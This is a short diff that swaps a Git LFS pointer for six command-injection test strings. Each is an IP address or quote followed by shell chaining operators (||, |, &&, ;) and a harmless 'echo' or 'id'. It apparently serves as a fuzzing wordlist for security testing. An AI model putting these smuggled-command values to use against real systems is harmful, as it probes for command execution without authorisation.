@@ -1,3 +1,6 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:905566d66348f1e7d667b7121370b177b706e7ab636d987dec4f7f4c137cc68e
-size 112
+127.0.0.1'"||"echo 'hi
+127.0.0.1'"|"echo 'hi
+127.0.0.1'"&&"echo 'hi
+127.0.0.1'";"echo 'hi
+"; id; #
+127.0.0.1;#"
